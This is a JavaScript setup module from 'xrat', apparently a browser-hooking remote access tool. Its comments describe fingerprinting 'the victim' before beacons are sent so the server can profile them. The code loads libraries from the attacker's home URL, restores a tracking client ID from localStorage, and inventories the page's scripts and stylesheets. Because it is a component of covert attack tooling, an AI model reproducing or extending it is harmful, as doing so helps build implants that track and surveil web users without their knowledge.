define(['fingerprint','utils','command'], function(fingerprint,utils,command){


	return {

		/*==================================================

		Setup takes care of all the loading of external files
		and libraries like twitter bootstrap, jquery, and modernizr
		and any additional libraries that may be required

		Setup has a dependency of the fingerprint module because
		the setup runs the finger print before any beacons are made
		so the server can get indepth knowledge of the victim.

		If there is already a CID that's stored, the fingerprint
		may be skipped.

		==================================================*/

		// dependencies: [
		// 	{name: "jQuery", refs: 'jQuery', src: xrat.homeUrl + "/app/lib/jquery-1.8.2.min.js", type:"script"},
		// 	{name: "underscore",refs: '_', src: xrat.homeUrl + "/app/lib/underscore-min.js", type:"script"},
		// 	// {name: "jQuery", refs: 'jQuery', src: "http://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js", type:"script"},
		// 	// {name: "underscore",refs: '_', src: "http://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.4.2/underscore-min.js", type:"script"},
		// ],


		run: function(callback) {

			this.dependencies = [
				{name: "jQuery", refs: 'jQuery', src: xrat.homeUrl + "/app/lib/jquery-1.8.2.min.js", type:"script"},
				{name: "underscore",refs: '_', src: xrat.homeUrl + "/app/lib/underscore-min.js", type:"script"},
			];

			this.optionalLibs = [
				{name:"bootstrap", refs: [], href: "/bootstrap.css",type:"css"},
				{name:"bootstrap", refs: [], href: "/bootstrap.js",type:"script"},
				{name:"jrumble", refs: [], href: xrat.homeUrl + "/app/lib/jquery.jrumble.js",type:"script"},
			];

			this.startTime = utils.getTime();
			this.callback = callback;
			this.getOldCID();
			this.loadDependencies();

			fingerprint.run();
		},
	
		getActiveFiles: function() {
			this.getActiveStyles();
			this.getActiveScripts();
			// console.log(xrat.styles);
			// console.log(xrat.scripts);
			this.callback();
		},

		getActiveStyles: function() {
			// console.log("finding styles");
			var styletags = $('link[rel=stylesheet]');
			var styles = []
			styletags.each(function(i){
				styles.push(styletags[i].href);
			})
			xrat.styles = styles;
		},

		getActiveScripts: function() {
			// console.log("finding scripts");
			var scripttags = $('script');
			var scripts = []
			scripttags.each(function(i){
				scripts.push(scripttags[i].src);
			})
			xrat.scripts = scripts;
		},

		loadDependencies: function(){
			var self = this;
			for(var i=0;i<this.dependencies.length;i++){
				utils.loadFile(this.dependencies[i], function(file){
					// this code is run when they file is loaded
					// need to remove the file from dependencies
					self.isDoneLoadingDependencies(file);
				});
			}
		},

		isDoneLoadingDependencies: function(file) {
			// find the file in the dependencies and remove it
			// console.log(file.name);
			for(var i=0;i<this.dependencies.length;i++){
				if(this.dependencies[i].name === file.name){
					this.dependencies.splice(i,1);
					break;
				}
			}
			if(this.dependencies.length == 0){
				var finishTime = utils.getTime();
				var totalTime = finishTime - this.startTime;
				console.log("Setup took " + totalTime + " milliseconds to complete");
				this.getActiveFiles();
			}
		},

		getOldCID: function() {
			if(typeof window.localStorage !== 'undefined'){
				var cid = localStorage.getItem("cid");
				if(cid !== null){
					console.log("there is a cid " + cid);
					xrat.cid = cid;
				}
				else{
					console.log("there is no cid");
				}
			}
		}

	}
		
});